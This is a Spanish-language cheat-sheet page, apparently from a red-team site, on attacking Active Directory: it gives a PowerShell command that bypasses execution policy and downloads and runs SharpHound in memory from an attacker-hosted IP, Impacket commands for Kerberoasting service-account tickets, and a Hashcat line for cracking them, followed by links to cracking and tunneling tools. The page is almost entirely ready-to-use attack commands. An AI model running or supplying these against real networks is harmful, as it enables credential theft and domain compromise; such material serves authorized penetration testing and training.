---
title: Active Directory / Red Teams
description: Tácticas de explotación interna de Active Directory, pivoting y BloodHound.
sidebar:
  order: 1
---

# 🌐 Active Directory & Red Teaming

Metodologías de asalto interno, compromisos de dominios corporativos y persistencia avanzada.

---

## 🐶 Recolección con BloodHound

### Ejecución de SharpHound
```powershell
# Ejecución en memoria sin tocar disco
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.X/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All -Domain target.local"
```

---

## 🎟️ Kerberoasting

### Extracción de TGS con Impacket
```bash
impacket-GetUserSPNs target.local/user:password -dc-ip 10.10.10.X -request
```

### Crackeo con Hashcat
```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 🛠️ Herramientas Relacionadas (Ecosistema pwnVader)

<aside class="my-6 p-4 rounded-md border-l-4 border-orange-400 bg-orange-500/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-orange-400 font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Tienes un hash Kerberoast listo para romper? Diseña la sintaxis de máscaras óptima en el <a href="https://hacking.pwnvader.com/cracking/hashcat" class="text-orange-400 hover:underline">Hashcat Mask Builder</a> de forma rápida e intuitiva.
  </p>
</aside>

<aside class="my-6 p-4 rounded-md border-l-4 border-orange-400 bg-orange-500/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-orange-400 font-bold mb-1">
    Herramienta · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    ¿Necesitas pivotar dentro de la red interna o configurar un proxy SOCKS? Diseña tus comandos de Chisel, SSH o Ligolo con el <a href="https://hacking.pwnvader.com/networking/tunneling" class="text-orange-400 hover:underline">Tunneling Comando Generator</a> y calcula tus rangos con el <a href="https://hacking.pwnvader.com/networking/subnet" class="text-orange-400 hover:underline">Subnet Calculator</a>.
  </p>
</aside>
